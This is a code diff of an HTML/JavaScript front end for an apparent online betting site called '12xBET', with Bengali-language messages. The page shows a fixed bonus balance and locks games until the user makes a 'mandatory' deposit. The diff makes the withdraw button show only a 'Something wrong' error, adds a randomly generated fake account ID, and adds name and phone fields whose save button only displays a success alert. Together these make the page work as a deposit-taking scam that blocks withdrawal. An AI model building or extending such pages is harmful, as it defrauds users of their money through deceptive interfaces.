@@ -41,7 +41,7 @@
         .reg-card { background: var(--glass); backdrop-filter: blur(15px); border: 1px solid rgba(255,204,0,0.3); padding: 25px; border-radius: 20px; width: 90%; max-width: 420px; box-shadow: 0 10px 40px rgba(0,0,0,0.5); text-align: center; }
         .input-group { margin-bottom: 15px; text-align: left; }
         .input-label { font-size: 11px; color: #aaa; margin-left: 5px; margin-bottom: 5px; display: block; }
-        .modern-input { width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid #444; border-radius: 12px; color: #fff; outline: none; }
+        .modern-input { width: 100%; padding: 14px; background: rgba(0,0,0,0.4); border: 1px solid #444; border-radius: 12px; color: #fff; outline: none; margin-bottom: 10px;}
         .complete-btn { background: var(--gold-gradient); color: #000; border: none; width: 100%; padding: 16px; font-weight: 800; border-radius: 12px; cursor: pointer; text-transform: uppercase; }
 
         /* --- MODALS --- */
@@ -59,18 +59,16 @@
         .opt-txt b { color: var(--gold); font-size: 14px; }
         .opt-txt span { color: #ccc; font-size: 11px; display: block; }
 
-        /* --- AUTO SLIDER --- */
-        .slider-wrapper { width: 100%; height: 190px; overflow: hidden; position: relative; border-bottom: 1px solid var(--gold); }
-        .slider-track { display: flex; width: 300%; height: 100%; transition: transform 0.8s ease-in-out; }
-        .slide { width: 33.33%; height: 100%; background-size: cover; background-position: center; }
-
         /* --- SIDEBAR --- */
         #side-menu { position: fixed; top: 0; left: -300px; width: 300px; height: 100%; background: #0d1117; z-index: 5000; transition: 0.4s; border-right: 1px solid var(--gold); overflow-y: auto; }
         #side-menu.active { left: 0; }
         .profile-container { padding: 30px 20px; text-align: center; background: #161b22; }
-        .profile-pic { width: 85px; height: 85px; border-radius: 50%; border: 3px solid var(--gold); object-fit: cover; }
-        .refreshing { animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .profile-pic-wrapper { position: relative; width: 85px; height: 85px; margin: 0 auto; }
+        .profile-pic { width: 100%; height: 100%; border-radius: 50%; border: 3px solid var(--gold); object-fit: cover; }
+        
+        /* --- WRONG NOTIFICATION --- */
+        #wrong-notif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: var(--fire-red); color: #fff; padding: 12px 25px; border-radius: 10px; font-weight: bold; z-index: 30000; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.5); animation: slideDown 0.3s ease; }
+        @keyframes slideDown { from { top: -50px; } to { top: 20px; } }
 
         /* --- MAIN UI --- */
         #main-content { display: none; }
@@ -83,9 +81,17 @@
         #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 20000; display: none; flex-direction: column; align-items: center; justify-content: center; }
         .menu-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 4000; }
         .menu-overlay.active { display: block; }
+        
+        .slider-wrapper { width: 100%; height: 190px; overflow: hidden; position: relative; border-bottom: 1px solid var(--gold); }
+        .slider-track { display: flex; width: 300%; height: 100%; transition: transform 0.8s ease-in-out; }
+        .slide { width: 33.33%; height: 100%; background-size: cover; background-position: center; }
+        .refreshing { animation: spin 1s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
+    <div id="wrong-notif">Something wrong</div>
 
     <section id="signup-page">
         <div class="header-logo">12x<span>BET</span></div>
@@ -147,16 +153,27 @@
     <div class="menu-overlay" id="overlay" onclick="closeMenu()"></div>
     <div id="side-menu">
         <div class="profile-container">
-            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" id="userPic" class="profile-pic">
+            <div class="profile-pic-wrapper">
+                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" id="userPic" class="profile-pic">
+                <label for="imgUpload" style="position:absolute; bottom:0; right:0; background:var(--gold); color:#000; width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px; cursor:pointer;"><i class="fa-solid fa-camera"></i></label>
+                <input type="file" id="imgUpload" hidden accept="image/*" onchange="previewImg(this)">
+            </div>
             <div id="displayEmail" style="margin-top:12px; font-size:13px; color:#aaa;">user@example.com</div>
-            <p style="font-size:10px; color:#888; margin-top:15px; margin-bottom:2px;">My Wallet Balance</p>
+            <div style="font-size:11px; color:#666; margin-bottom:15px;">Account ID: <span id="displayID">000000</span></div>
+            <p style="font-size:10px; color:#888; margin-bottom:2px;">My Wallet Balance</p>
             <div style="color:var(--gold); font-size:24px; font-weight:800; cursor:pointer;" onclick="refreshBalEffect(this)">
                 ৳ <span class="bal-val">২০০.০০</span> <i class="fa-solid fa-rotate-right" style="font-size:14px; margin-left:5px;"></i>
             </div>
         </div>
         <div style="display:flex; gap:10px; padding:15px;">
             <button onclick="triggerDirectDeposit()" style="flex:1; background:var(--green); border:none; padding:12px; border-radius:8px; font-weight:bold; cursor:pointer;">DEPOSIT</button>
-            <button onclick="openExternal()" style="flex:1; background:#fff; border:none; padding:12px; border-radius:8px; font-weight:bold; cursor:pointer;">WITHDRAW</button>
+            <button onclick="showWrongNotif()" style="flex:1; background:#fff; border:none; padding:12px; border-radius:8px; font-weight:bold; cursor:pointer;">WITHDRAW</button>
+        </div>
+        <div style="padding:20px;">
+            <div style="font-size:12px; color:var(--gold); margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:5px;">ব্যক্তিগত তথ্য (PERSONAL INFO)</div>
+            <input type="text" class="modern-input" placeholder="Full Name (Optional)">
+            <input type="tel" class="modern-input" placeholder="Mobile Number (Optional)">
+            <button class="complete-btn" style="font-size:12px;" onclick="saveInformation()">SAVE INFORMATION</button>
         </div>
     </div>
 
@@ -191,6 +208,7 @@
                 document.getElementById('signup-page').style.display = 'none';
                 document.getElementById('main-content').style.display = 'block';
                 document.getElementById('displayEmail').innerText = email;
+                document.getElementById('displayID').innerText = Math.floor(100000 + Math.random() * 900000);
                 document.getElementById('welcome-modal').style.display = 'flex';
                 renderGames();
             });
@@ -213,7 +231,7 @@
             showLoader(1000, () => {
                 document.getElementById('game-img-container').style.display = 'block';
                 document.getElementById('activeGameImg').src = img;
-                document.getElementById('dep-msg').innerText = "আপনার বর্তমান ব্যালেন্স খেলা শুরু করার জন্য বৈধ নয়, ব্যালেন্সটি ব্যবহার করার জন্য একটি বৈধ ডিপোজিট বাধ্যতামূলক!";
+                document.getElementById('dep-msg').innerHTML = "আপনার বর্তমান ব্যালেন্স খেলা শুরু করার জন্য বৈধ নয়, ব্যালেন্সটি ব্যবহার করার জন্য একটি বৈধ ডিপোজিট বাধ্যতামূলক!";
                 document.getElementById('game-lock-modal').style.display = 'flex';
             });
         }
@@ -222,9 +240,15 @@
             closeMenu();
             showLoader(800, () => {
                 document.getElementById('game-img-container').style.display = 'none';
-                document.getElementById('dep-msg').innerHTML = "<b style='font-size:16px; color:var(--gold);'>আপনি আপনার প্রথম ডিপোজিট বোনাস টি বেছে নিন</b>";
+                document.getElementById('dep-msg').innerHTML = "<b style='font-size:18px; color:var(--gold); display:block; margin-bottom:10px;'>আপনি আপনার প্রথম ডিপোজিট বোনাস টি বেছে নিন</b>";
                 document.getElementById('game-lock-modal').style.display = 'flex';
             });
+        }
+
+        function showWrongNotif() {
+            const notif = document.getElementById('wrong-notif');
+            notif.style.display = 'block';
+            setTimeout(() => { notif.style.display = 'none'; }, 2500);
         }
 
         function selectOpt(el) {
@@ -232,6 +256,15 @@
             el.classList.add('active');
         }
 
+        function previewImg(input) {
+            if (input.files && input.files[0]) {
+                var reader = new FileReader();
+                reader.onload = function(e) { document.getElementById('userPic').src = e.target.result; }
+                reader.readAsDataURL(input.files[0]);
+            }
+        }
+
+        function saveInformation() { alert("আপনার তথ্য সফলভাবে সংরক্ষিত হয়েছে!"); closeMenu(); }
         function showLoader(t, cb) {
             const l = document.getElementById('loader');
             l.style.display = 'flex';
@@ -241,14 +274,12 @@
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
         function closeOnOverlay(e, id) { if(e.target.id === id) closeModal(id); }
         function openExternal() { window.location.href = "https://messenger.jacklyn.site"; }
-
         function refreshBalEffect(el) {
             const icon = el.querySelector('.fa-rotate-right');
             icon.classList.add('refreshing');
             setTimeout(() => icon.classList.remove('refreshing'), 1500);
         }
 
-        // Auto Slider
         let sIdx = 0;
         setInterval(() => {
             sIdx = (sIdx + 1) % 3;
